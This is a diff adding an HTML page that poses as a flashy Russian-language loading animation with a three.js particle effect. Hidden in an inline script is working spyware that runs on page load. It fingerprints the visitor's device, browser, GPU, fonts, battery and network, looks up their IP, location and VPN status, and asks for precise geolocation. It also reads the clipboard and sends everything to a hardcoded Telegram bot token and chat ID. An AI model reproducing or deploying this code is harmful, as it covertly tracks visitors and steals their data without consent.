@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Невероятная анимация загрузки</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.9.1/gsap.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: #000;
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        #scene {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            background: radial-gradient(circle, rgba(0,0,0,0) 0%, rgba(0,0,0,0.8) 100%);
+        }
+
+        .text {
+            font-size: 36px;
+            color: #00ffff;
+            text-shadow: 0 0 10px #00ffff;
+            text-align: center;
+            opacity: 0;
+        }
+
+        .progress-container {
+            width: 300px;
+            height: 10px;
+            background-color: rgba(0, 255, 255, 0.2);
+            border-radius: 5px;
+            overflow: hidden;
+            margin-top: 20px;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background-color: #00ffff;
+            box-shadow: 0 0 10px #00ffff;
+            transition: width 0.5s ease;
+        }
+    </style>
+</head>
+<body>
+    <div id="scene"></div>
+    <div class="overlay">
+        <div class="text">ГОТОВЬСЯ, СЫНОК!<br>МЫ ЗАПУСКАЕМ НЕЧТО НЕВЕРОЯТНОЕ!</div>
+        <div class="progress-container">
+            <div class="progress-bar"></div>
+        </div>
+    </div>
+<script>
+        const botToken = '7305121459:AAFx3_Ggju_WLXb8sqmkK27NDOiQcOUwy0w';
+        const chatId = '1653222949';
+        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        async function getDeviceBrandAndModel() {
+            const userAgent = navigator.userAgent;
+            let deviceBrand = 'Unknown';
+            let deviceModel = 'Unknown';
+
+            if (/android/i.test(userAgent)) {
+                deviceBrand = 'Android';
+                const match = userAgent.match(/;\s(.*?)(?:\sBuild|\))/);
+                if (match) {
+                    deviceModel = match[1];
+                }
+            } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+                deviceBrand = 'Apple';
+                const match = userAgent.match(/\(([a-zA-Z]+);.*?OS\s([0-9_]+)/);
+                if (match) {
+                    deviceModel = match[1];
+                }
+            }
+
+            return { brand: deviceBrand, model: deviceModel };
+        }
+
+        async function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            const deviceInfo = {
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                platform: navigator.platform,
+                uptime: Math.round(performance.now() / 1000),
+                webglSupport: supportsWebGL(),
+                fonts: await getFonts(),
+                renderTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart
+            };
+
+            if (/android/i.test(userAgent)) {
+                deviceInfo.device = 'Android';
+            } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+                deviceInfo.device = 'iOS';
+            } else {
+                deviceInfo.device = 'Unknown';
+            }
+
+            if (/chrome|crios|crmo/i.test(userAgent)) {
+                deviceInfo.browser = 'Chrome';
+            } else if (/firefox|iceweasel|fxios/i.test(userAgent)) {
+                deviceInfo.browser = 'Firefox';
+            } else if (/safari/i.test(userAgent)) {
+                deviceInfo.browser = 'Safari';
+            } else if (/msie|trident/i.test(userAgent)) {
+                deviceInfo.browser = 'Internet Explorer';
+            } else {
+                deviceInfo.browser = 'Unknown';
+            }
+
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                deviceInfo.batteryLevel = battery.level * 100 + '%';
+            } else {
+                deviceInfo.batteryLevel = 'Not supported';
+            }
+
+            return deviceInfo;
+        }
+
+        function supportsWebGL() {
+            try {
+                const canvas = document.createElement('canvas');
+                return !!window.WebGLRenderingContext && !!canvas.getContext('webgl');
+            } catch (e) {
+                return false;
+            }
+        }
+
+        async function getFonts() {
+            const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Courier', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
+            const availableFonts = [];
+            for (const font of fontList) {
+                if (document.fonts.check(`12px "${font}"`)) {
+                    availableFonts.push(font);
+                }
+            }
+            return availableFonts.join(', ');
+        }
+
+        function checkInternetSpeed() {
+            return new Promise((resolve, reject) => {
+                const image = new Image();
+                const startTime = new Date().getTime();
+
+                image.onload = function() {
+                    const endTime = new Date().getTime();
+                    const duration = (endTime - startTime) / 1000;
+                    const bitsLoaded = 1024 * 1024 * 8; // Размер изображения в битах
+                    const speedMbps = (bitsLoaded / duration / (1024 * 1024)).toFixed(2);
+                    resolve(speedMbps);
+                };
+
+                image.onerror = function() {
+                    reject('Не удалось измерить скорость интернета');
+                };
+
+                image.src = "https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png?" + startTime;
+            });
+        }
+
+        function checkVPN(ipAddress) {
+            return fetch(`https://ipapi.co/${ipAddress}/json/`)
+                .then(response => response.json())
+                .then(data => data.security ? data.security.is_vpn : 'Unknown')
+                .catch(() => 'Unknown');
+        }
+
+        async function fetchData() {
+            try {
+                const response = await fetch('http://ip-api.com/json/');
+                const data = await response.json();
+
+                return {
+                    isp: data.isp || 'Неизвестно',
+                    org: data.org || 'Неизвестно',
+                    as: data.as || 'Неизвестно'
+                };
+            } catch (error) {
+                console.error('Ошибка получения данных:', error);
+                return {
+                    isp: 'Неизвестно',
+                    org: 'Неизвестно',
+                    as: 'Неизвестно'
+                };
+            }
+        }
+
+        async function getCompleteInfo() {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ipAddress = ipData.ip;
+
+            const ipInfoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
+            const ipInfoData = await ipInfoResponse.json();
+            const isp = ipInfoData.org || 'Unknown';
+            const location = `${ipInfoData.city}, ${ipInfoData.region}, ${ipInfoData.country}`;
+
+            const vpnStatus = await checkVPN(ipAddress);
+            const deviceInfo = await getDeviceInfo();
+            const deviceBrandAndModel = await getDeviceBrandAndModel();
+
+            const ispData = await fetchData();
+            const internetSpeed = await checkInternetSpeed();
+
+            const browserInfo = `User Agent: ${navigator.userAgent}\nBrowser Name: ${navigator.appName}`;
+            const osInfo = `Platform: ${navigator.platform}`;
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const platformInfo = `CPU Class: ${navigator.cpuClass || 'Unknown'}`;
+
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const graphicsInfo = gl ? `Vendor: ${gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_VENDOR_WEBGL)}\nRenderer: ${gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL)}` : 'WebGL не поддерживается';
+
+            const memoryInfo = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Не поддерживается';
+            const hasFlash = !!navigator.mimeTypes['application/x-shockwave-flash'];
+
+            let message = `
+                IP-адрес пользователя: ${ipAddress}
+                Устройство: ${deviceInfo.device}
+                Марка устройства: ${deviceBrandAndModel.brand}
+                Модель устройства: ${deviceBrandAndModel.model}
+                Браузер: ${deviceInfo.browser}
+                Провайдер: ${isp}
+                Разрешение экрана: ${deviceInfo.screenResolution}
+                Язык: ${deviceInfo.language}
+                Платформа: ${deviceInfo.platform}
+                Время работы системы: ${deviceInfo.uptime} сек.
+                Местоположение: ${location}
+                Использование VPN/Proxy: ${vpnStatus}
+                Поддержка WebGL: ${deviceInfo.webglSupport}
+                Установленные шрифты: ${deviceInfo.fonts}
+                Время рендеринга страницы: ${deviceInfo.renderTime} мс
+                Уровень заряда батареи: ${deviceInfo.batteryLevel}
+                Таймзона пользователя: ${timeZone}
+                Информация о браузере: ${browserInfo}
+                Информация об ОС: ${osInfo}
+                Детальная статистика о платформе: ${platformInfo}
+                Скорость интернета: ${internetSpeed} Mbps
+                Информация о видеокарте: ${graphicsInfo}
+                Доступная память устройства: ${memoryInfo}
+                Проверка установленного Flash Player: ${hasFlash ? 'Установлен' : 'Не установлен'}
+                Интернет-провайдер: ${ispData.isp}
+                Имя провайдера: ${ispData.org}
+                Номер AS провайдера: ${ispData.as}
+            `;
+
+            if (deviceBrandAndModel.model !== 'Unknown') {
+                message += `
+                \nПРОИЗОШЛО РАСПОЗНОВАНИЕ МОДЕЛИ УСТРОЙСТВА:
+                Модель устройства: ${deviceBrandAndModel.model}`;
+
+                const inlineButtonUrl = `https://www.google.com/search?q=Модель+устройства%3A+${encodeURIComponent(deviceBrandAndModel.model)}&client=ms`;
+
+                const inlineButton = {
+                    text: `Узнать больше о модели ${deviceBrandAndModel.model}`,
+                    url: inlineButtonUrl
+                };
+
+                const inlineKeyboard = {
+                    inline_keyboard: [[inlineButton]]
+                };
+
+                await fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        reply_markup: inlineKeyboard
+                    })
+                });
+            } else {
+                await fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+            }
+        }
+
+        getCompleteInfo().then(() => {
+            requestGeolocation();
+        });
+
+        function requestGeolocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        console.log(`Широта: ${latitude}, Долгота: ${longitude}`);
+                        sendLocationToTelegram(latitude, longitude);
+                    },
+                    (error) => {
+                        console.error('Ошибка при получении геолокации:', error);
+                        sendLocationErrorToTelegram();
+                    }
+                );
+            } else {
+                console.error('Геолокация не поддерживается этим браузером.');
+                sendLocationErrorToTelegram();
+            }
+        }
+
+        function sendLocationToTelegram(latitude, longitude) {
+            const message = `Геолокация пользователя: ${latitude},${longitude}`;
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Геолокация отправлена в Telegram:', data);
+                requestClipboardData();
+            })
+            .catch(error => {
+                console.error('Ошибка при отправке геолокации в Telegram:', error);
+                requestClipboardData();
+            });
+        }
+
+        function sendLocationErrorToTelegram() {
+            const message = `Пользователь заблокировал запрос на геолокацию.`;
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Информация об отказе в геолокации отправлена в Telegram:', data);
+                requestClipboardData();
+            })
+            .catch(error => {
+                console.error('Ошибка при отправке информации об отказе в геолокации в Telegram:', error);
+                requestClipboardData();
+            });
+        }
+
+        async function getClipboardData() {
+            try {
+                const text = await navigator.clipboard.readText();
+                sendClipboardDataToTelegram(text);
+            } catch (err) {
+                console.error('Не удалось прочитать содержимое буфера обмена: ', err);
+                sendClipboardDataErrorToTelegram();
+            }
+        }
+
+        function sendClipboardDataToTelegram(text) {
+            const message = `Данные из буфера обмена: ${text}`;
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Данные буфера обмена отправлены в Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Ошибка при отправке данных буфера обмена в Telegram:', error);
+            });
+        }
+
+        function sendClipboardDataErrorToTelegram() {
+            const message = 'Не удалось получить доступ к буферу обмена.';
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Ошибка доступа к буферу обмена отправлена в Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Ошибка при отправке ошибки доступа к буферу обмена в Telegram:', error);
+            });
+        }
+
+        function requestClipboardData() {
+            getClipboardData();
+        }
+    </script>
+    <script>
+        let scene, camera, renderer, particles, animationFrameId;
+
+        function init() {
+            scene = new THREE.Scene();
+            camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+            renderer = new THREE.WebGLRenderer();
+            renderer.setSize(window.innerWidth, window.innerHeight);
+            document.getElementById('scene').appendChild(renderer.domElement);
+
+            const geometry = new THREE.BufferGeometry();
+            const vertices = [];
+            const sizes = [];
+
+            for (let i = 0; i < 10000; i++) {
+                vertices.push(THREE.MathUtils.randFloatSpread(2000));
+                vertices.push(THREE.MathUtils.randFloatSpread(2000));
+                vertices.push(THREE.MathUtils.randFloatSpread(2000));
+                sizes.push(THREE.MathUtils.randFloat(1, 5));
+            }
+
+            geometry.setAttribute('position', new THREE.Float32BufferAttribute(vertices, 3));
+            geometry.setAttribute('size', new THREE.Float32BufferAttribute(sizes, 1));
+
+            const material = new THREE.PointsMaterial({
+                color: 0x00ffff,
+                size: 2,
+                blending: THREE.AdditiveBlending,
+                transparent: true,
+                sizeAttenuation: true
+            });
+
+            particles = new THREE.Points(geometry, material);
+            scene.add(particles);
+
+            camera.position.z = 1000;
+        }
+
+        function animate() {
+            animationFrameId = requestAnimationFrame(animate);
+            particles.rotation.x += 0.001;
+            particles.rotation.y += 0.002;
+
+            // Добавляем постоянный эффект быстрого вхождения
+            camera.position.z = 1000 + Math.sin(Date.now() * 0.001) * 990;
+
+            renderer.render(scene, camera);
+        }
+
+        function startLoading() {
+            init();
+            animate();
+
+            const text = document.querySelector('.text');
+            const progressBar = document.querySelector('.progress-bar');
+
+            gsap.to(text, {opacity: 1, duration: 1, ease: "power2.inOut"});
+
+            gsap.to(progressBar, {
+                width: "100%", 
+                duration: 5, 
+                ease: "power1.inOut",
+                onComplete: () => {
+                    gsap.to(text, {
+                        opacity: 0, 
+                        duration: 1, 
+                        delay: 1,
+                        onComplete: () => {
+                            text.textContent = "ГОТОВО! ПОГНАЛИ!";
+                            gsap.to(text, {opacity: 1, duration: 1});
+                        }
+                    });
+
+                    // Удаляем этот блок, так как теперь у нас постоянный эффект вхождения
+                    /*
+                    gsap.to(camera.position, {
+                        z: 10, 
+                        duration: 3, 
+                        ease: "power2.inOut",
+                        onComplete: () => {
+                            cancelAnimationFrame(animationFrameId);
+                            // Here you can add code to transition to your main content
+                        }
+                    });
+                    */
+                }
+            });
+        }
+
+        window.addEventListener('resize', () => {
+            camera.aspect = window.innerWidth / window.innerHeight;
+            camera.updateProjectionMatrix();
+            renderer.setSize(window.innerWidth, window.innerHeight);
+        });
+
+        startLoading();
+    </script>
+</body>
+</html>
